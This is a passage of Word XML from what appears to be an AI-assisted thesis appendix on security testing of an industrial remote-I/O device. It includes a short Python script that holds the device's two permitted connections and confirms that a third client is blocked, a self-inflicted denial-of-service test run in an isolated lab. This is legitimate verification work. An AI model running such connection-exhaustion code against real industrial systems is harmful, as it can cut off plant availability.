        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>b"GET</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deviceinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>swrevision</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP/1.1\r\</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>nHost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dut</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>\r\n") # header withheld</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2699EE1B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return s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5052A7" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="767FD07E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held = [hold(), hold()] # occupy both permitted connections (SRIO-7909)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206E6D7B" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>time.sleep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="476ADD54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>print("[*] 2 connections held; probing with a 3rd legitimate request...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B9AA97" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>r = subprocess.run(["curl","-s","-m","3","-o","/dev/null","-w","%{http_code}",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D26336" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>f"http</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>://{DUT}/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deviceinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>swinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scpuversion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">"], </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>capture_output</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=True, text=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C34C7DD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 xml:space="preserve">print("[+] 3rd-client HTTP code:", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>r.stdout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or "TIMEOUT") # expect: timeout/refused -&gt; G-2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE43A6E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 xml:space="preserve">for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>s in</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> held: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>s.close</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71A2834C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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Third-client read </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>times out / is refused</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> while both connections are held; access returns after release (SRIO-7909). | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ 3rd read blocked (G-2 confirmed) ☐ Access restored on release | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Script console log, curl timing, optional mirror PCAP of the three sessions | </w:t>
      </w:r>
      <w:hyperlink r:id="rId175" w:history="1">
        <w:r w:rsidRPr="00E55DD7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E55DD7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E55DD7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0293E5D6" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Scope note:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> this is the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>self-inflicted, RQ-007-specific</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> design DoS (two legitimate connections suffice). </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Generalized malicious flooding of the device is RQ-010 (TC-</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>RQ010-02).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Even this benign socket-hold runs on the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Pi</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, isolated Zone-B, PLC-monitored. </w:t>
      </w:r>
      <w:hyperlink r:id="rId176" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7EE4F384" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:pict w14:anchorId="0E093B16">
          <v:rect id="_x0000_i1484" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="305F18AD" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Summary of Changes (vs. my original RQ-007)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4269DB" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Re-framed the primary threat</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> from**"DoS attack"** to**"inherent unavailability (design/reliability limitation)."** The dominant failing is the device's </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>own operating states</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Init, install-reboot, SCPU-flash, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>FatalError</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>manufacturer's EMC "not-supervised" concession</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — none of which is a third-party attack. STRIDE still labels this under DoS broadly, but the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cause is design, not malice</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, and that framing better matches the "</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>at all times</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">" text. </w:t>
      </w:r>
      <w:hyperlink r:id="rId177" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00015538">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId178" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[100_SRIO_P...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4DE3DB90" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Deferred generalized DoS/flood to RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — removed </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TS-4 (sustained load/flood)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>attack-induction of the COM-fault test</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TS-4 is now a redundancy/reliability check</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-3), not an attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396AF775" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Kept the RQ-007-specific self-DoS</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (2-connection cap, G-2) — it is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>design property of this identification service</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, not generalized flooding, so it stays.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A41CAB" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Anchored the accessibility limb to CR 6.1</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and credited the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Visualizer</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-4, largely met) for a balanced verdict.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DECABCE" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Held the boundary:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>completeness</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → RQ-006, </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>confidentiality</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → RQ-004/006, </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>generalized DoS resilience</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → RQ-010; </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>here = availability + accessibility only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B87D5F5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 xml:space="preserve">Corrected verdict, tightly bounded: </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-007 = provide the identification "at all times" (availability — fails via ≥5 inherent operational windows + a self-inflicted 2-connection DoS + no redundancy) in an "easily accessible form" (accessibility — met via the Visualizer)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — with </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>generalized malicious DoS</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> deferred to </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7527BC7E" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Would you like me to (a) </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>re-check RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> next, to confirm it now correctly </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>receives</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the deferred generalized-DoS/flood tests from RQ-001 and RQ-007 (and that its firmware-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EoP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> cross-references RQ-005/RQ-011 cleanly), or (b) proceed to </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>compile the fully corrected RQ-001 → RQ-014 set into the consolidated thesis appendix</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454F06CE" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="352B3D00" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
